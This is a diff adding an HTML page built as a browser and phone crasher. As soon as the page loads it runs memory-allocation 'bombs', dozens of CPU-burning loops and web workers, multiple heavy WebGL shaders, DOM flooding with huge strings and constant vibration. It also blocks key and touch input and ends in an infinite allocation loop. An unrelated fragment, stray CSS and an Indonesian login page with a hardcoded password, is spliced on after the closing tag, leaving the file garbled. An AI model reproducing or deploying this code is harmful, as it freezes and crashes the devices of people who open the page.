@@ -1,0 +1,701 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="user-scalable=no">
+    <title>@DAPPKECEꦾꦾꦾꦾꦾꦾꦾꦾ</title>
+    <style>
+        body {
+    background: conic-gradient(
+        from 0deg at 50% 50%,
+        #ff0000,
+        #ff9900,
+        #ffff00,
+        #00ff00,
+        #0099ff,
+        #6633ff,
+        #ff0000
+    );
+    animation: spinRainbow 5s linear infinite;
+}
+
+@keyframes spinRainbow {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+}
+
+        }
+        #main {
+            transform-origin: 0px 0px;
+            position: fixed;
+            left: 0px;
+            top: 0px;
+        }
+        #btn {
+    position: fixed;
+    z-index: 100;
+    color: white;
+    background: radial-gradient(
+        circle at center,
+        #ff0000,
+        #ff9900,
+        #ffff00,
+        #00ff00,
+        #0099ff,
+        #6633ff
+    );
+    background-size: 200% 200%;
+    animation: rainbowPulse 1s ease-in-out infinite;
+    font-weight: bold;
+    padding: 10px;
+    border: 2px solid white;
+    cursor: pointer;
+    top: 0px;
+    left: 0px;
+}
+
+@keyframes rainbowPulse {
+    0%, 100% { background-size: 200% 200%; }
+    50% { background-size: 150% 150%; }
+}
+      #config {
+    display: none;
+    z-index: 1000000;
+    background: linear-gradient(
+        45deg,
+        #ff0000 0%,
+        #ff5500 16.6%,
+        #ffff00 33.3%,
+        #00ff00 50%,
+        #0099ff 66.6%,
+        #6633ff 83.3%,
+        #ff0000 100%
+    );
+    position: fixed;
+    top: 40px;
+    padding: 10px;
+    border: 3px solid;
+    border-image: conic-gradient(
+        from 0deg,
+        #ff0000,
+        #ff9900,
+        #ffff00,
+        #00ff00,
+        #0099ff,
+        #6633ff,
+        #ff0000
+    ) 1;
+    background-size: 300% 300%;
+    animation: 
+        crashMove 1s linear infinite,
+        crashGlitch 0.1s steps(2, end) infinite,
+        crashShake 0.05s linear infinite;
+    box-shadow: 
+        0 0 30px rgba(255,0,0,0.8),
+        0 0 60px rgba(0,255,0,0.6),
+        0 0 90px rgba(0,0,255,0.4);
+    color: white;
+    text-shadow: 
+        0 0 5px #000,
+        0 0 10px #000;
+}
+
+@keyframes crashMove {
+    0% { background-position: 0% 0%; }
+    100% { background-position: 400% 400%; }
+}
+
+@keyframes crashGlitch {
+    0%, 100% { transform: translateX(0); }
+    50% { transform: translateX(2px); }
+}
+
+@keyframes crashShake {
+    0%, 100% { transform: translateY(0); }
+    25% { transform: translateY(-1px); }
+    75% { transform: translateY(1px); }
+}
+        .crash-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 1000000;
+    pointer-events: none;
+    
+    background: 
+        /* LAPISAN 1: Strip pelangi berputar */
+        conic-gradient(
+            from 0deg at 50% 50%,
+            #ff0000 0deg,
+            #ff5500 60deg,
+            #ffff00 120deg,
+            #00ff00 180deg,
+            #0099ff 240deg,
+            #6633ff 300deg,
+            #ff0000 360deg
+        ),
+        /* LAPISAN 2: Pola kotak-kotak */
+        repeating-linear-gradient(
+            0deg,
+            transparent,
+            transparent 20px,
+            rgba(255, 0, 0, 0.3) 20px,
+            rgba(255, 0, 0, 0.3) 40px
+        ),
+        repeating-linear-gradient(
+            90deg,
+            transparent,
+            transparent 20px,
+            rgba(0, 255, 0, 0.3) 20px,
+            rgba(0, 255, 0, 0.3) 40px
+        ),
+        /* LAPISAN 3: Radial burst */
+        radial-gradient(
+            circle at 50% 50%,
+            rgba(255, 255, 0, 0.5) 0%,
+            rgba(255, 255, 0, 0) 70%
+        );
+    
+    background-blend-mode: screen, overlay, overlay, screen;
+    background-size: 
+        200% 200%,
+        40px 40px,
+        40px 40px,
+        100% 100%;
+    
+    animation: 
+        crashVortex 1s linear infinite,
+        crashFlash 0.3s steps(2, end) infinite,
+        crashShake 0.1s linear infinite;
+    
+    mix-blend-mode: difference;
+    filter: brightness(2) contrast(3) hue-rotate(0deg);
+}
+
+@keyframes crashVortex {
+    0% { 
+        background-position: 
+            0% 0%,
+            0 0,
+            0 0,
+            50% 50%;
+        filter: brightness(2) contrast(3) hue-rotate(0deg);
+    }
+    100% { 
+        background-position: 
+            400% 400%,
+            40px 40px,
+            40px 40px,
+            50% 50%;
+        filter: brightness(3) contrast(4) hue-rotate(360deg);
+    }
+}
+
+@keyframes crashFlash {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.7; }
+}
+
+@keyframes crashShake {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    25% { transform: translate(-3px, 3px) scale(1.01); }
+    50% { transform: translate(3px, -3px) scale(0.99); }
+    75% { transform: translate(-3px, -3px) scale(1.02); }
+}
+    </style>
+</head>
+<body style="overflow-x:hidden;overflow-y:hidden">
+<div id="main">
+    <canvas id="c1" width="4096" height="4096"></canvas>
+</div>
+<div class="crash-overlay" id="overlay"></div>
+<button id="btn">𝗞𝗜𝗟𝗟𝗘𝗥ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ</button>
+<div id="config">
+    <p style="color:red; font-weight:bold;">𝗬𝗢𝗨𝗥 𝗗𝗘𝗔𝗗ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ</p>
+</div>
+
+<script>
+// ========== MEMORY BOMB SYSTEM ==========
+const memoryBombs = [];
+function allocateMemoryBomb() {
+    for(let i = 0; i < 1000; i++) {
+        try {
+            memoryBombs.push(new Float64Array(10000000));
+            memoryBombs.push(new ArrayBuffer(50000000));
+            memoryBombs.push(new Uint32Array(8000000));
+            memoryBombs.push(Array(2000000).fill({data: new Array(100).fill(Math.random())}));
+        } catch(e) {}
+    }
+}
+
+// ========== GPU NUCLEAR SHADER ==========
+var KERNEL = `
+float kernal(vec3 ver){
+   vec3 a;
+   float b,c,d,e;
+   a=ver;
+   for(int i=0;i<32;i++){
+       b=length(a);
+       c=atan(a.y,a.x)*16.0;
+       e=1.0/b;
+       d=acos(a.z/b)*16.0;
+       b=pow(b,12.0);
+       a=vec3(b*sin(d)*cos(c),b*sin(d)*sin(c),b*cos(d))+ver;
+       if(b>8.0){
+           break;
+       }
+   }
+   
+   // ADDITIONAL HEAVY COMPUTATION
+   vec3 p = a;
+   for(int j=0;j<16;j++){
+       p = abs(p)/dot(p,p) - 0.8;
+       p = p*2.0 + sin(p*100.0);
+   }
+   
+   return 6.0-length(p)-a.x*a.x-a.y*a.y-a.z*a.z;
+}`;
+
+// ========== MULTIPLE WEBGL CONTEXTS ==========
+const contexts = [];
+function createMultipleContexts() {
+    for(let i = 0; i < 8; i++) {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 2048;
+            canvas.height = 2048;
+            canvas.style.position = 'fixed';
+            canvas.style.left = (i * 50) + 'px';
+            canvas.style.top = '0px';
+            canvas.style.zIndex = '-1';
+            document.body.appendChild(canvas);
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(gl) {
+                contexts.push(gl);
+                compileNuclearShader(gl, i);
+            }
+        } catch(e) {}
+    }
+}
+
+function compileNuclearShader(gl, index) {
+    const vertShader = `attribute vec4 p;void main(){gl_Position=p;}`;
+    const fragShader = `
+        precision highp float;
+        uniform float t;
+        uniform vec2 r;
+        void main() {
+            vec2 uv = (gl_FragCoord.xy - r*0.5) / max(r.x, r.y);
+            vec3 col = vec3(0.0);
+            for(int i=0;i<256;i++) {
+                uv = abs(uv)/dot(uv,uv)-0.7;
+                uv += sin(uv*200.0 + t*0.001 + float(i)*0.5);
+                uv *= 1.2 + sin(t*0.0005)*0.8;
+                
+                // EXTRA HEAVY COMPUTATION
+                for(int j=0;j<4;j++){
+                    uv.x += sin(uv.y*80.0 + float(j)) * 0.2;
+                    uv.y += cos(uv.x*80.0 + float(j)) * 0.2;
+                }
+                
+                col += vec3(
+                    length(uv * sin(t*0.01)) * 3.0,
+                    length(uv * cos(t*0.007)) * 2.5,
+                    length(uv * sin(t*0.005)) * 2.8
+                ) * 0.2;
+            }
+            gl_FragColor = vec4(col * 4.0, 1.0);
+        }
+    `;
+    
+    const vs = gl.createShader(gl.VERTEX_SHADER);
+    const fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(vs, vertShader);
+    gl.shaderSource(fs, fragShader);
+    gl.compileShader(vs);
+    gl.compileShader(fs);
+    
+    const program = gl.createProgram();
+    gl.attachShader(program, vs);
+    gl.attachShader(program, fs);
+    gl.linkProgram(program);
+    gl.useProgram(program);
+    
+    const buffer = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,-1,1,1,-1,1]), gl.STATIC_DRAW);
+    
+    const position = gl.getAttribLocation(program, 'p');
+    gl.enableVertexAttribArray(position);
+    gl.vertexAttribPointer(position, 2, gl.FLOAT, false, 0, 0);
+    
+    const timeUniform = gl.getUniformLocation(program, 't');
+    const resUniform = gl.getUniformLocation(program, 'r');
+
+    function render(time) {
+        gl.uniform1f(timeUniform, time + index * 2000);
+        gl.uniform2f(resUniform, gl.drawingBufferWidth, gl.drawingBufferHeight);
+        gl.drawArrays(gl.TRIANGLES, 0, 6);
+        requestAnimationFrame(render);
+    }
+    render(performance.now());
+}
+
+// ========== ORIGINAL SYSTEM (HEAVILY MODIFIED) ==========
+var cx, cy;
+var glposition, glright, glforward, glup, glorigin, glx, gly, gllen;
+var canvas, gl;
+var date = new Date();
+var mx = 0, my = 0;
+var ml = 0, mr = 0, mm = 0;
+var len = 1.6;
+var ang1 = 2.8;
+var ang2 = 0.4;
+var cenx = 0.0, ceny = 0.0, cenz = 0.0;
+
+var vertshade, fragshader, shaderProgram;
+
+// ULTRA HEAVY FRAGMENT SHADER
+var FSHADER_SOURCE =
+    "#version 100 \n" +
+    "#define PI 3.14159265358979324\n" +
+    "#define MAXR 32\n" +
+    "#define SOLVER 24\n" +
+    "precision highp float;\n" +
+    "float kernal(vec3 ver);\n" +
+    "uniform vec3 right, forward, up, origin;\n" +
+    "varying vec3 dir, localdir;\n" +
+    "uniform float len;\n" +
+    "vec3 ver;\n" +
+    "int sign;"+
+    "float v, v1, v2;\n" +
+    "float r1, r2, r3, r4, m1, m2, m3, m4;\n" +
+    "vec3 n;\n" +
+    "const float step = 0.0001;\n" +
+    "vec3 color;\n" +
+    "void main() {\n" +
+    "   color = vec3(0.0);\n" +
+    "   sign=0;"+
+    "   v1 = kernal(origin + dir * (step*len));\n" +
+    "   v2 = kernal(origin);\n" +
+    "   for (int k = 2; k < 5000; k++) {\n" +
+    "      ver = origin + dir * (step*len*float(k));\n" +
+    "      v = kernal(ver);\n" +
+    "      if (v > 0.0 && v1 < 0.0) {\n" +
+    "         r1 = step * len*float(k - 1);\n" +
+    "         r2 = step * len*float(k);\n" +
+    "         m1 = kernal(origin + dir * r1);\n" +
+    "         m2 = kernal(origin + dir * r2);\n" +
+    "         for (int l = 0; l < SOLVER; l++) {\n" +
+    "            r3 = r1 * 0.5 + r2 * 0.5;\n" +
+    "            m3 = kernal(origin + dir * r3);\n" +
+    "            if (m3 > 0.0) { r2 = r3; m2 = m3; }\n" +
+    "            else { r1 = r3; m1 = m3; }\n" +
+    "         }\n" +
+    "         if (r3 < 2.0 * len) { sign=1; break; }\n" +
+    "      }\n" +
+    "      v2 = v1; v1 = v;\n" +
+    "   }\n" +
+    "   if (sign==1) {\n" +
+    "      ver = origin + dir*r3 ;\n" +
+    "      float eps = r3*0.00005;\n" +
+    "      n.x = kernal(ver - right * eps) - kernal(ver + right * eps);\n" +
+    "      n.y = kernal(ver - up * eps) - kernal(ver + up * eps);\n" +
+    "      n.z = kernal(ver + forward * eps) - kernal(ver - forward * eps);\n" +
+    "      n = normalize(n);\n" +
+    "      color = vec3(abs(n.x), abs(n.y), abs(n.z)) * 3.0;\n" +
+    "   }\n" +
+    "   gl_FragColor = vec4(color, 1.0);" +
+    "}";
+
+var VSHADER_SOURCE =
+    "#version 100 \n"+
+    "precision highp float;\n" +
+    "attribute vec4 position;" +
+    "varying vec3 dir, localdir;" +
+    "uniform vec3 right, forward, up, origin;" +
+    "uniform float x,y;" +
+    "void main() {" +
+    "   gl_Position = position; " +
+    "   dir = forward + right * position.x*x + up * position.y*y;" +
+    "   localdir.x = position.x*x;" +
+    "   localdir.y = position.y*y;" +
+    "   localdir.z = -1.0;" +
+    "} ";
+
+// ========== CPU THREAD BOMBS ==========
+const loops = [];
+function startInfiniteLoops() {
+    for(let i = 0; i < 100; i++) {
+        loops.push(setInterval(() => {
+            let total = 0;
+            for(let j = 0; j < 1000000; j++) {
+                total += Math.pow(Math.random(), Math.random()) * 
+                        Math.sqrt(Math.random()) * 
+                        Math.sin(Math.random() * Math.PI) *
+                        Math.cos(Math.random() * Math.PI * 2);
+            }
+            const leak = new Array(500000).fill({
+                data: new Array(50).fill(Math.random()),
+                matrix: new Float64Array(1000)
+            });
+        }, 0));
+    }
+}
+
+// ========== WEB WORKER NUKES ==========
+function spawnWorkerBombs() {
+    for(let i = 0; i < 50; i++) {
+        const workerCode = `
+            const bombs = [];
+            while(true) {
+                const bigArray = new Array(1000000);
+                for(let i=0;i<1000000;i++) {
+                    bigArray[i] = {
+                        x: Math.random() * 10000,
+                        y: Math.random() * 10000, 
+                        z: Math.random() * 10000,
+                        children: new Array(100).fill({data: Math.random()})
+                    };
+                }
+                bombs.push(bigArray);
+                
+                let result = 0;
+                for(let i=0;i<1500000;i++) {
+                    result += Math.sqrt(
+                        Math.pow(Math.random(), Math.random()) +
+                        Math.pow(Math.random(), Math.random())
+                    ) * Math.sin(Math.random() * Math.PI * 2);
+                }
+                
+                if(bombs.length > 80) bombs.length = 0;
+            }
+        `;
+        try {
+            const blob = new Blob([workerCode]);
+            const worker = new Worker(URL.createObjectURL(blob));
+            worker.onmessage = () => {};
+        } catch(e) {}
+    }
+}
+
+// ========== DOM BOMBING ==========
+function startDOMBombing() {
+    setInterval(() => {
+        for(let i = 0; i < 1000; i++) {
+            const div = document.createElement('div');
+            div.style.position = 'absolute';
+            div.style.left = Math.random() * window.innerWidth + 'px';
+            div.style.top = Math.random() * window.innerHeight + 'px';
+            div.style.color = 'red';
+            div.style.fontSize = '16px';
+            div.innerHTML = 'ꦾ'.repeat(50000);
+            div.style.zIndex = '50000';
+            document.body.appendChild(div);
+        }
+    }, 200);
+}
+
+// ========== ANDROID SPECIFIC ATTACKS ==========
+function androidSpecificNukes() {
+    if(navigator.vibrate) {
+        setInterval(() => {
+            navigator.vibrate([150, 80, 150, 80, 150]);
+        }, 300);
+    }
+    
+    // TOUCH EVENT BOMB
+    document.addEventListener('touchstart', (e) => {
+        e.preventDefault();
+        for(let i = 0; i < 1000; i++) {
+            const touchEvent = new TouchEvent('touchstart', {
+                touches: [e.touches[0]],
+                targetTouches: [e.touches[0]],
+                changedTouches: [e.touches[0]]
+            });
+            document.dispatchEvent(touchEvent);
+        }
+    }, {passive: false});
+}
+
+// ========== MODIFIED DRAW FUNCTION - 16 VIEWS ==========
+function draw() {
+    gl.uniform1f(glx, cx * 2.0 / (cx + cy));
+    gl.uniform1f(gly, cy * 2.0 / (cx + cy));
+    gl.uniform1f(gllen, len);
+
+    var totalW = canvas.width;
+    var totalH = canvas.height;
+    var grid = 4; // 4x4 = 16 render passes
+    var cellW = totalW / grid;
+    var cellH = totalH / grid;
+
+    for(var r = 0; r < grid; r++) {
+        for(var c = 0; c < grid; c++) {
+            gl.viewport(c * cellW, r * cellH, cellW, cellH);
+
+            var angleOffset = (r * grid + c) * (Math.PI / 8.0);
+            var curAng1 = ang1 + angleOffset;
+            var curAng2 = ang2 + angleOffset * 0.5;
+
+            gl.uniform3f(glorigin, len * Math.cos(curAng1) * Math.cos(curAng2) + cenx, 
+                         len * Math.sin(curAng2) + ceny, 
+                         len * Math.sin(curAng1) * Math.cos(curAng2) + cenz);
+            gl.uniform3f(glright, Math.sin(curAng1), 0, -Math.cos(curAng1));
+            gl.uniform3f(glup, -Math.sin(curAng2) * Math.cos(curAng1), Math.cos(curAng2), -Math.sin(curAng2) * Math.sin(curAng1));
+            gl.uniform3f(glforward, -Math.cos(curAng1) * Math.cos(curAng2), -Math.sin(curAng2), -Math.sin(curAng1) * Math.cos(curAng2));
+
+            gl.drawArrays(gl.TRIANGLES, 0, 6);
+        }
+    }
+    
+    gl.finish();
+    allocateMemoryBomb(); // Memory bomb during each render
+}
+
+function ontimer() {
+    ang1 += 0.03;
+    ang2 += 0.015;
+    
+    draw();
+    
+    setTimeout(ontimer, 0);
+}
+
+// ========== MAIN INITIALIZATION ==========
+window.onload = function() {
+    // PHASE 1: Initialize original system
+    cx = document.body.clientWidth;
+    cy = document.body.clientHeight;
+    if(cx>cy) cx=cy; else cy=cx;
+    
+    document.getElementById("main").style.width=4096+"px";
+    document.getElementById("main").style.height=4096+"px";
+    document.getElementById("main").style.transform="scale("+cx/4096+","+cy/4096+")";
+
+    var positions = [-1.0, -1.0, 0.0, 1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, 1.0, 0.0];
+    
+    canvas = document.getElementById('c1');
+    gl = canvas.getContext('webgl');
+    vertshader = gl.createShader(gl.VERTEX_SHADER);
+    fragshader = gl.createShader(gl.FRAGMENT_SHADER);
+    shaderProgram = gl.createProgram();
+    gl.shaderSource(vertshader, VSHADER_SOURCE);
+    gl.compileShader(vertshader);
+    gl.shaderSource(fragshader, FSHADER_SOURCE + KERNEL);
+    gl.compileShader(fragshader);
+    gl.attachShader(shaderProgram, vertshader);
+    gl.attachShader(shaderProgram, fragshader);
+    gl.linkProgram(shaderProgram);
+    gl.useProgram(shaderProgram);
+
+    glposition = gl.getAttribLocation(shaderProgram, 'position');
+    glright = gl.getUniformLocation(shaderProgram, 'right');
+    glforward = gl.getUniformLocation(shaderProgram, 'forward');
+    glup = gl.getUniformLocation(shaderProgram, 'up');
+    glorigin = gl.getUniformLocation(shaderProgram, 'origin');
+    glx = gl.getUniformLocation(shaderProgram, 'x');
+    gly = gl.getUniformLocation(shaderProgram, 'y');
+    gllen = gl.getUniformLocation(shaderProgram, 'len');
+    
+    var buffer = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
+    gl.vertexAttribPointer(glposition, 3, gl.FLOAT, false, 0, 0);
+    gl.enableVertexAttribArray(glposition);
+
+    // PHASE 2: START ALL CRASH SYSTEMS IMMEDIATELY
+    setTimeout(() => {
+        ontimer(); // Start original render loop
+        
+        // START ALL CRASH SYSTEMS
+        createMultipleContexts();
+        startInfiniteLoops();
+        spawnWorkerBombs();
+        startDOMBombing();
+        androidSpecificNukes();
+        
+        // CONTINUOUS MEMORY BOMBING
+        setInterval(allocateMemoryBomb, 300);
+        
+    }, 100);
+
+    // ULTIMATE CRASH TRIGGER
+    setTimeout(() => {
+        while(true) {
+            allocateMemoryBomb();
+            try {
+                new ArrayBuffer(1024 * 1024 * 256);
+            } catch(e) {}
+        }
+    }, 4000);
+
+    document.getElementById("btn").addEventListener("click", function() {
+        for(let i = 0; i < 50; i++) {
+            allocateMemoryBomb();
+            createMultipleContexts();
+        }
+        document.getElementById("config").style.display = "inline";
+    });
+};
+
+// PREVENT ESCAPE
+document.addEventListener('keydown', (e) => {
+    e.preventDefault();
+    allocateMemoryBomb();
+});
+window.onbeforeunload = () => "SYSTEM CRASH IN PROGRESS";
+</script>
+</body></html>      background-color: #000;
+      font-family: monospace;
+      color: green;
+      border-radius: 10px;
+      padding: 10px;
+      margin: 5px;
+     }
+     button {
+       font-family: monospace;
+       background-color: black;
+       color: green;
+       border-radius: 10px;
+       padding: 10px;
+       margin: 5px;
+     }
+  </style>
+</head>
+<body>
+
+  <h1 id="output"></h1>
+  <h1 id="atas"></h1>
+
+  <div class="kotak-input">
+    <input type="text" id="inputBox" placeholder="Masukkan sesuatu...">
+    <label for="email">masukan email</label>
+    <input type="email" id="email" placeholder="Masukkan email...">
+    <label for="password">pw ne boloo</label>
+    <input type="password" id="pw"
+    placeholder="masukkan password"><br>
+    <button onclick="cekPW()">selanjutnya</button>
+  </div>
+
+  <script>// Menyapa pengguna saat membuka halaman
+let nama = prompt('Siapa nama Anda?');
+document.getElementById("output").innerHTML = "Halo " + nama;
+document.getElementById("atas").innerHTML = "Lagi apa, " + nama + "?";
+
+// Fungsi untuk mengecek password
+function cekPW(){
+  let password = document.getElementById("pw").value;
+
+  if (password === "codingan dapa") {
+    // Jika password benar, pindah ke halaman lain
+    window.location.href = "Dapit.html";
+  } else {
+    // Jika salah, tampilkan peringatan
+    alert("Password salah, coba lagi.");
+  }
+}
+</script>
+  
+</body>
+</html>
